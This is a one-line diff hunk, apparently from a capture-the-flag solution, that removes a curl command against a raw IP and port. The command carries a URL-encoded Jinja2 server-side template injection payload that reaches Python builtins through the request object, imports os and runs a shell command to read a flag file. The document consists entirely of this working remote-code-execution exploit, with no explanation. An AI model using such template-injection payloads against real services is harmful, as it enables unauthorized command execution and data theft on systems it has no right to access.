@@ -1,1 +1,0 @@
-curl "http://139.59.168.174:31490/?name=%7B%7Brequest%5B%27application%27%5D%5B%27__globals__%27%5D%5B%27__builtins__%27%5D%5B%27__import__%27%5D%28%27os%27%29%5B%27popen%27%5D%28%27cat+flag%27%29%5B%27read%27%5D%28%29%7D%7D"
